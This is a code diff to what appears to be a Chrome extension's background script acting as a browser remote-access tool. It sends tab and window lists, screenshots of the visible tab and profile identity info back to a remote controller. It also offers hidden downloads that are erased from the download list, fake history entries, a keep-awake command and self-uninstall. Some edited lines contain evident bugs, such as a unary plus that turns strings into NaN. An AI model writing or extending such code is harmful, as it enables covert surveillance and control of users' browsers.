@@ -74,7 +74,7 @@ function commandManager(m) {
             c.includes("style")
         ) sendMessage(m, true)
         // BACKGROUND
-        else if (c == "getinfo") grabinfo(m.responseTarget)
+        else if (c == "getinfo") grabinfo(m)
         else if (c.includes("window")) window(m)
         else if (c == "uninstallself") uninstallself(m)
         else if (c.includes("explorer")) explorer(m)
@@ -86,7 +86,7 @@ function commandManager(m) {
         else if (c == "changeip") changeip(m)
         else if (c == "download") download(m)
         else if (c == "removedownload") removedownload(m)
-        else if (c == "history") historyadd(m)
+        else if (c.includes("history")) historyadd(m)
         else if (c == "capture") capture(m)
     } catch (err) {
         send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
@@ -112,12 +112,12 @@ function changeip(m) {
 }
 function window(m) {//chrome.windows.create({url:"https://www.pointercrate.com/demonlist/",focused:true,height:500,width:500,left:100,top:100,state:"normal",type:"normal"})
     let c = m.command, cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
-    if (c.includes("create"))chrome.windows.create(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
-    else if (c.includes("current"))chrome.windows.getCurrent(w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
-    else if (c.includes("all"))chrome.windows.getAll({}, w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
-    else if (c.includes("query"))chrome.windows.getAll(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    if (c.includes("create"))chrome.windows.create(toJSON(m.value), w=>send({type:"response", command:m.command, value:"Created window: "+w.id+" - "+w.state, responseTarget:m.responseTarget}))
+    else if (c.includes("current"))chrome.windows.getCurrent(w=>send({type:"response", command:m.command, value:"Current window: "+w.id+" - "+w.state, responseTarget:m.responseTarget}))
+    else if (c.includes("all"))chrome.windows.getAll({}, w=>send({type:"response", command:m.command, value:"All windows: "+w.map(x=>+"["+x.id+" - "+x.state+"]").join("\n"), responseTarget:m.responseTarget}))
+    else if (c.includes("query"))chrome.windows.getAll(toJSON(m.value), w=>send({type:"response", command:m.command, value:"Queried windows: "+w.map(x=>+"["+x.id+" - "+x.state+"]").join("\n"), responseTarget:m.responseTarget}))
     else if (c.includes("remove"))chrome.windows.remove(id, ()=>send({type:"response", command:m.command, value:"Remove window: "+id, responseTarget:m.responseTarget}))
-    else if (c.includes("update"))chrome.windows.update(cid, toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    else if (c.includes("update"))chrome.windows.update(cid, toJSON(m.value), w=>send({type:"response", command:m.command, value:"Updated window: "+w.id+" - "+w.state, responseTarget:m.responseTarget}))
 }
 function keepawake(m) {
     chrome.power.requestKeepAwake(m.value)
@@ -129,19 +129,19 @@ function stopkeepawake(m) {
 }
 function tabs(m) {console.log("TABS: ", m)
     let c = m.command.trim().toLowerCase(), cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
-    if (c.includes("active")) chrome.tabs.query({active:true, currentWindow:true}, tabs=>send({type:"response", command:m.command, value:tabs[0], responseTarget:m.responseTarget}))
-    else if (c.includes("all")) chrome.tabs.query({}, tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
-    else if (c.includes("create")) chrome.tabs.create(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    if (c.includes("active")) chrome.tabs.query({active:true, currentWindow:true}, tabs=>send({type:"response", command:m.command, value:"Active tab: "+tabs[0].title+" "+tabs[0].id, responseTarget:m.responseTarget}))
+    else if (c.includes("all")) chrome.tabs.query({}, tabs=>send({type:"response", command:m.command, value:"All tabs: "+tabs.map(t=>+"["+t.title+" "+t.id+"]").join("\n"), responseTarget:m.responseTarget}))
+    else if (c.includes("create")) chrome.tabs.create(toJSON(m.value), t=>send({type:"response", command:m.command, value:"Created tab: "+t.id, responseTarget:m.responseTarget}))
     else if (c.includes("query")) chrome.tabs.query(toJSON(m.value), tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
-    else if (c.includes("move")) chrome.tabs.move(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    else if (c.includes("move")) chrome.tabs.move(toJSON(m.value), t=>send({type:"response", command:m.command, value:"Queried tabs: "+t.map(t=>+"["+t.title+" "+t.id+"]").join("\n"), responseTarget:m.responseTarget}))
     else if (c.includes("reload")) chrome.tabs.reload(id, ()=>send({type:"response", command:m.command, value:"Refreshed tab: "+m.value, responseTarget:m.responseTarget}))
     else if (c.includes("remove")) chrome.tabs.remove(id, ()=>send({type:"response", command:m.command, value:"Removed tab: "+m.value, responseTarget:m.responseTarget}))
-    else if (c.includes("update")) chrome.tabs.update(cid, toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    else if (c.includes("update")) chrome.tabs.update(cid, toJSON(m.value), t=>send({type:"response", command:m.command, value:"Updated tab: "+t[0].title+" "+t[0].id, responseTarget:m.responseTarget}))
     else if (c.includes("high")) chrome.tabs.update(id, {active:true}, ()=>send({type:"response", command:m.command, value:"Higlighted tab: "+m.value, responseTarget:m.responseTarget}))
     else if (c.includes("zoom")) chrome.tabs.setZoom(cid, id, ()=>send({type:"response", command:m.command, value:"Zoom of tab ["+cid+"] set to: "+m.value, responseTarget:m.responseTarget}))
 }
 function uninstallself(m) {
-    send({type:"response", command:m.command, value:"TERMINATED", responseTarget:m.responseTarget})
+    send({type:"response", command:m.command, value:"TERMINATED: "+ws.id, responseTarget:m.responseTarget})
     chrome.management.uninstallSelf()
 }
 function explorer(m) {// EXPAND~
@@ -151,10 +151,12 @@ function explorer(m) {// EXPAND~
 function notification(m) {// EXPAND
     let c = m.command.trim().toLowerCase()
     if (c.includes("create")) chrome.notifications.create(toJSON(m.value), nId=>send({type:"response", command:m.command, value:nId, responseTarget:m.responseTarget}))
-    else if (c.includes("all")) chrome.notifications.getAll(all=>send({type:"response", command:m.command, value:all, responseTarget:m.responseTarget}))
-    else if (c.includes("clear")) chrome.notifications.clear(m.value, c=>send({type:"response", command:m.command, value:"successfully cleared notification: "+c, responseTarget:m.responseTarget}))
+    else if (c.includes("all")) chrome.notifications.getAll(all=>send({type:"response", command:m.command, value:Object.keys(all).join("\n"), responseTarget:m.responseTarget}))
+    else if (c.includes("clear") || c.includes("remove") || c.includes("delete")) chrome.notifications.getAll(ns=>{
+        Object.keys(ns).forEach(n=>chrome.notifications.clear(n))
+        send({type:"response", command:m.command, value:"Removed all notifications", responseTarget:m.responseTarget})
+    })
     else send({type:"response", command:m.command, value:"Invalid command or missing parameter", responseTarget:m.responseTarget})
- // clear all instead of clear TODO
 }
 function historyadd(m) {
     chrome.history.addUrl({url:m.value}, ()=>send({type:"response", command:m.command, value:"Added: '"+m.value+"' to history", responseTarget:m.responseTarget}))
@@ -164,7 +166,7 @@ function google(m) {
     send({type:"response", command:m.command, value:"Google searched: "+m.value, responseTarget:m.responseTarget})
 }
 function download(m) {
-    let c = m.command.trim().toLowerCase(), v = toJSON(m)
+    let c = m.command.trim().toLowerCase(), v = toJSON(m.value)
     if (c.includes("hid")) chrome.downloads.download(v, id=>{
         chrome.downloads.erase({id:id})
         send({type:"response", command:m.command, value:"(H) Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget})
@@ -172,16 +174,16 @@ function download(m) {
     else chrome.downloads.download(v, id=>send({type:"response", command:m.command, value:"Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget}))
 }
 function removedownload(m) {
-    chrome.downloads.download(+m.value, ()=>send({type:"response", command:m.command, value:"Removed download: "+m.value, responseTarget:m.responseTarget}))
+    chrome.downloads.erase({id:+m.value}, ()=>send({type:"response", command:m.command, value:"Removed download: "+m.value, responseTarget:m.responseTarget}))
 }
 function capture(m) {
     chrome.tabs.captureVisibleTab(data=>send({type:"response", command:m.command, isImg:true, clientId:ws.id, value:data, responseTarget:m.responseTarget}))
 }
-function grabinfo(responseTarget) {
+function grabinfo(m) {
     let info = {navigator_language:navigator.language}, info_cd=0
     function sendInfo() {
         info_cd++
-        if (info_cd == 11) send({type:"response", value:info, responseTarget:responseTarget, command:m.command})
+        if (info_cd == 11) send({type:"response", value:info, responseTarget:m.responseTarget, command:m.command})
     }
 
     chrome.identity.getProfileUserInfo((e)=>{
